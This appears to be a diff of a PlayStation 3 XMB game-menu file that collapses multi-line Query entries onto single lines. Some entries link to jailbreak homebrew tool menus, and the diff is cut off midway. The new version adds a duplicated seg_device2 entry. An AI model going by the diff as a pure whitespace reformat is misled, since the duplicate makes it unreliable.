@@ -1,5 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
-
 <XMBML version="1.0">
 	<View id="root">
 		<Attributes>
@@ -23,127 +22,29 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_psp2appdata"
-				src="#seg_psp2appdata"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_gamedata"
-				src="#seg_gamedata"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_mcutility"
-				src="#seg_mcutility"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_sdps2"
-				src="sel://localhost/ps2emusave?category_game.xml#seg_sdps2"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_sdpsp"
-				src="#seg_sdpsp"
-				/>
-
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_sdps3"
-				src="#seg_sdps3"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_welcome"
-				attr="seg_welcome"
-				src="sel://localhost/welcome?type=game"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_gamedebug"
-				src="#seg_gamedebug"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_package_files"
-				src="#seg_package_files"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="ps3xploit_xmb"
-				src="xmb://localhost/dev_hdd0/game/PS3XPLOIT/USRDIR/ps3xploit_xmb.xml#ps3xploit_xmb_main"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="game_xmbm_hdd0"
-				src="xmb://localhost/dev_hdd0/game/XMBMANPLS/USRDIR/game_main.xml#seg_xmb_hdd0_app"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="han_toolbox_xmb"
-				src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/han_toolbox_xmb.xml#han_toolbox_xmb_main"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="xmb_app3"
-				attr="xmb_app3"
-				src="xmb://localhost/dev_hdd0/xmlhost/game_plugin/fb.xml#seg_fb"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_gameexit"
-				src="sel://localhost/ingame?path=category_game.xml#seg_gameexit&type=game"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_manual"
-				src="sel://localhost/ingame?path=category_game.xml#seg_manual&type=manual"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_device"
-				attr="seg_device"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+An+StorageMedia:Common.fileName BDV"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_device_bdv"
-				attr="seg_device_bdv"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:Common.fileName BDV"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_device2"
-				attr="seg_device2"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:StorageMedia.hybrid HYBRID&opt=option_hybrid"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_add_content_device"
-				attr="seg_add_content_device"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_DVDPRW+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3CONTENT_BD %xCB_MEDIA_FORMAT_PS3CONTENT_DVD+Ae+StorageMedia:Common.fileName EX_GAME"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_mv_content_device"
-				attr="seg_mv_content_device"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_DVDPRW+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3CONTENT_BD %xCB_MEDIA_FORMAT_PS3CONTENT_DVD+Ae+StorageMedia:Common.fileName THEMEDIR"
-				/>
-
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="gameDir"
-				attr="gameDir"
-				src="xil://localhost/list?t=game"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="gameDir2"
-				attr="gameDir2"
-				src="sel://localhost/ex?root.view_selected.game"
-			/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_psp2appdata" src="#seg_psp2appdata"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_gamedata" src="#seg_gamedata"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_mcutility" src="#seg_mcutility"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_sdps2" src="sel://localhost/ps2emusave?category_game.xml#seg_sdps2"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_sdpsp" src="#seg_sdpsp"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_sdps3" src="#seg_sdps3"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_welcome" attr="seg_welcome" src="sel://localhost/welcome?type=game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_gamedebug" src="#seg_gamedebug"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_package_files" src="#seg_package_files"/>
+			<Query class="type:x-xmb/folder-pixmap" key="ps3xploit_xmb" src="xmb://localhost/dev_hdd0/game/PS3XPLOIT/USRDIR/ps3xploit_xmb.xml#ps3xploit_xmb_main"/>
+			<Query class="type:x-xmb/folder-pixmap" key="game_xmbm_hdd0" src="xmb://localhost/dev_hdd0/game/XMBMANPLS/USRDIR/game_main.xml#seg_xmb_hdd0_app"/>
+			<Query class="type:x-xmb/folder-pixmap" key="han_toolbox_xmb" src="xmb://localhost/dev_hdd0/game/HANTOOLBX/USRDIR/han_toolbox_xmb.xml#han_toolbox_xmb_main"/>
+			<Query class="type:x-xmb/folder-pixmap" key="xmb_app3" attr="xmb_app3" src="xmb://localhost/dev_hdd0/xmlhost/game_plugin/fb.xml#seg_fb"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_gameexit" src="sel://localhost/ingame?path=category_game.xml#seg_gameexit&type=game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_manual" src="sel://localhost/ingame?path=category_game.xml#seg_manual&type=manual"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_device" attr="seg_device" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+An+StorageMedia:Common.fileName BDV"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_device_bdv" attr="seg_device_bdv" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:Common.fileName BDV"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_device2" attr="seg_device2" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:StorageMedia.hybrid HYBRID&opt=option_hybrid"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_device2" attr="seg_device2" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:StorageMedia.hybrid HYBRID&opt=option_hybrid"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_add_content_device" attr="seg_add_content_device" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_DVDPRW+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3CONTENT_BD %xCB_MEDIA_FORMAT_PS3CONTENT_DVD+Ae+StorageMedia:Common.fileName EX_GAME"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_mv_content_device" attr="seg_mv_content_device" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_DVDPRW+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3CONTENT_BD %xCB_MEDIA_FORMAT_PS3CONTENT_DVD+Ae+StorageMedia:Common.fileName THEMEDIR"/>
+			<Query class="type:x-xmb/folder-pixmap" key="gameDir" attr="gameDir" src="xil://localhost/list?t=game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="gameDir2" attr="gameDir2" src="sel://localhost/ex?root.view_selected.game"/>
 		</Items>
 	</View>
 
@@ -169,84 +70,21 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_gamedata"
-				src="#seg_gamedata"
-				/>
-
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_sdps3"
-				src="#seg_sdps3"
-				/>
-
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_gameexit"
-				src="sel://localhost/ingame?path=category_game.xml#seg_gameexit&type=game"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_manual"
-				src="sel://localhost/ingame?path=category_game.xml#seg_manual&type=manual"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_device"
-				attr="seg_device"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+An+StorageMedia:Common.fileName BDV"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_device_bdv"
-				attr="seg_device_bdv"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:Common.fileName BDV"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_device2"
-				attr="seg_device2"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:StorageMedia.hybrid HYBRID&opt=option_hybrid"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_add_content_device"
-				attr="seg_add_content_device"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_DVDPRW+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3CONTENT_BD %xCB_MEDIA_FORMAT_PS3CONTENT_DVD+Ae+StorageMedia:Common.fileName EX_GAME"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_mv_content_device"
-				attr="seg_mv_content_device"
-				src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_DVDPRW+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3CONTENT_BD %xCB_MEDIA_FORMAT_PS3CONTENT_DVD+Ae+StorageMedia:Common.fileName THEMEDIR"
-				/>
-
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="gameDir"
-				attr="gameDir"
-				src="xcb://localhost/query?limit=2048&table=MMS_MEDIA_TYPE_HDD&sort=-Game:Common.stat.rating-Game:Common.timeCreated&cond=Aa+Game:Common.title+An+Game:Game.category GD+An+Game:Game.category 2D+An+Game:Game.category CB+An+Game:Game.category HM+An+Game:Game.category AT+An+Game:Game.category AV+An+Game:Game.category AM+An+Game:Game.category VF+An+Game:Game.category AP+An+Game:Game.category BV+An+Game:Game.category WT+An+Game:Game.category SF+An+Game:Game.category AS+AG+Game:Common.stat.rating 300"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_hdd_install"
-				src="ese://localhost/query?type=install_game"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_pkg_install"
-				src="ese://localhost/query?type=install_pkg"
-			/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="gameDir2"
-				attr="gameDir2"
-				src="sel://localhost/ex?root.view_selected.game"
-			/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_gamedata" src="#seg_gamedata"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_sdps3" src="#seg_sdps3"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_gameexit" src="sel://localhost/ingame?path=category_game.xml#seg_gameexit&type=game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_manual" src="sel://localhost/ingame?path=category_game.xml#seg_manual&type=manual"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_device" attr="seg_device" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+An+StorageMedia:Common.fileName BDV"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_device_bdv" attr="seg_device_bdv" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type+StorageMedia:Common.timeCreated&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:Common.fileName BDV"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_device2" attr="seg_device2" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_PS1_CD+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3GAME_BD %xCB_MEDIA_FORMAT_PS1GAME_CD+Ae+StorageMedia:StorageMedia.hybrid HYBRID&opt=option_hybrid"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_add_content_device" attr="seg_add_content_device" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_DVDPRW+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3CONTENT_BD %xCB_MEDIA_FORMAT_PS3CONTENT_DVD+Ae+StorageMedia:Common.fileName EX_GAME"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_mv_content_device" attr="seg_mv_content_device" src="xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&sort=+StorageMedia:StorageMedia.type&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_PS3_BD %xCB_MEDIA_TYPE_DVDPRW+AGL+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_PS3CONTENT_BD %xCB_MEDIA_FORMAT_PS3CONTENT_DVD+Ae+StorageMedia:Common.fileName THEMEDIR"/>
+			<Query class="type:x-xmb/folder-pixmap" key="gameDir" attr="gameDir" src="xcb://localhost/query?limit=2048&table=MMS_MEDIA_TYPE_HDD&sort=-Game:Common.stat.rating-Game:Common.timeCreated&cond=Aa+Game:Common.title+An+Game:Game.category GD+An+Game:Game.category 2D+An+Game:Game.category CB+An+Game:Game.category HM+An+Game:Game.category AT+An+Game:Game.category AV+An+Game:Game.category AM+An+Game:Game.category VF+An+Game:Game.category AP+An+Game:Game.category BV+An+Game:Game.category WT+An+Game:Game.category SF+An+Game:Game.category AS+AG+Game:Common.stat.rating 300"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_hdd_install" src="ese://localhost/query?type=install_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_pkg_install" src="ese://localhost/query?type=install_pkg"/>
+			<Query class="type:x-xmb/folder-pixmap" key="gameDir2" attr="gameDir2" src="sel://localhost/ex?root.view_selected.game"/>
 		</Items>
 	</View>
-
 
 	<View id="seg_psp2appdata">
 		<Attributes>
@@ -259,7 +97,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query class="type:x-xmb/xmlpsp2appdata" key="psp2appdata"  attr="psp2appdata"/>
+			<Query class="type:x-xmb/xmlpsp2appdata" key="psp2appdata" attr="psp2appdata"/>
 		</Items>
 	</View>
 
@@ -271,7 +109,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_vita" attr="psp2appdata_vita" />
+			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_vita" attr="psp2appdata_vita"/>
 		</Items>
 	</View>
 	<View id="seg_psp2appdata_psp">
@@ -282,7 +120,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_psp" attr="psp2appdata_psp" />
+			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_psp" attr="psp2appdata_psp"/>
 		</Items>
 	</View>
 	<View id="seg_psp2appdata_ps1">
@@ -293,7 +131,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_ps1" attr="psp2appdata_ps1" />
+			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_ps1" attr="psp2appdata_ps1"/>
 		</Items>
 	</View>
 	<View id="seg_psp2appdata_psm">
@@ -304,7 +142,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_psm" attr="psp2appdata_psm" />
+			<Item class="type:x-xmb/xmlpsp2appdata-cont" key="psp2appdata_psm" attr="psp2appdata_psm"/>
 		</Items>
 	</View>
 
@@ -319,7 +157,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query class="type:x-xmb/folder-pixmap" key="gamedata"  attr="gamedata" src="xcb://localhost/query?limit=2048&table=MMS_MEDIA_TYPE_HDD&sort=-Game:Common.timeCreated&cond=Ae+Game:Game.category GD+Oe+Game:Game.category 2D" />
+			<Query class="type:x-xmb/folder-pixmap" key="gamedata" attr="gamedata" src="xcb://localhost/query?limit=2048&table=MMS_MEDIA_TYPE_HDD&sort=-Game:Common.timeCreated&cond=Ae+Game:Game.category GD+Oe+Game:Game.category 2D"/>
 		</Items>
 	</View>
 
@@ -335,7 +173,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query class="type:x-xmb/xmlmcutility" key="sdvmc" attr="sdvmc" src="#sdvmc_2nd" />
+			<Query class="type:x-xmb/xmlmcutility" key="sdvmc" attr="sdvmc" src="#sdvmc_2nd"/>
 		</Items>
 	</View>
 
@@ -354,7 +192,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query class="type:x-xmb/xmlsavedata-ps2" key="sdps2"  attr="sdps2"/>
+			<Query class="type:x-xmb/xmlsavedata-ps2" key="sdps2" attr="sdps2"/>
 		</Items>
 	</View>
 
@@ -373,7 +211,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query class="type:x-xmb/xmlsavedata-ps3" key="sdps3"  attr="sdps3"/>
+			<Query class="type:x-xmb/xmlsavedata-ps3" key="sdps3" attr="sdps3"/>
 		</Items>
 	</View>
 
@@ -385,33 +223,32 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query class="type:x-xmb/xmlsavedata-plus" key="sdplus"  attr="sdplus"/>
+			<Query class="type:x-xmb/xmlsavedata-plus" key="sdplus" attr="sdplus"/>
 		</Items>
 	</View>
 
-        <View id="seg_sdpsp">
-                <Attributes>
-                        <Table key="sdpsp">
-                                <Pair key="icon_rsc"><String>item_tex_psputil</String></Pair>
-                                <Pair key="icon_notation"><String>WNT_XmbItemSavedataMinis</String></Pair>
-                                <Pair key="title_rsc"><String>msg_savedata_utility_minis_psp</String></Pair>
-                                <Pair key="action"><String>exec_pspsavedata</String></Pair>
-                                <Pair key="ms_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_MS+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_MS_STD %xCB_MEDIA_TYPE_MS_IOX+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
-                                <Pair key="sd_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_SD+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
-                                <Pair key="cf_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_CF+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
-                                <Pair key="mass_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder+StorageMedia:StorageMedia.timeInserted&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+AGL+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_USBMASS %xCB_DEVICE_TYPE_USBWM+An+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_ETHER+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
-                                <Pair key="data_connection"><String>xcb://localhost/query?limit=2048&ssort=root.sort_selected.savedata_psp_all</String></Pair>
-                        </Table>
-                </Attributes>
-                <Items>
-                        <Query class="type:x-xmb/xmlsavedata-psp" key="sdpsp"  attr="sdpsp"/>
-                </Items>
-        </View>
-
+	<View id="seg_sdpsp">
+		<Attributes>
+			<Table key="sdpsp">
+				<Pair key="icon_rsc"><String>item_tex_psputil</String></Pair>
+				<Pair key="icon_notation"><String>WNT_XmbItemSavedataMinis</String></Pair>
+				<Pair key="title_rsc"><String>msg_savedata_utility_minis_psp</String></Pair>
+				<Pair key="action"><String>exec_pspsavedata</String></Pair>
+				<Pair key="ms_connection"><String>xcb://localhost/query?table=MMS_MEDIA_TYPE_SYSTEM&subclass=x-xcb/storagemedia-sdpsp&sort=+StorageMedia:StorageMedia.sortOrder&genre=Game&cond=Ae+StorageMedia:StorageMedia.stat.mediaStatus %xCB_MEDIA_INSERTED+Ae+StorageMedia:StorageMedia.deviceType %xCB_DEVICE_TYPE_MS+AGL+StorageMedia:StorageMedia.type %xCB_MEDIA_TYPE_MS_STD %xCB_MEDIA_TYPE_MS_IOX+Ae+StorageMedia:StorageMedia.mediaFormat %xCB_MEDIA_FORMAT_DATA</String></Pair>
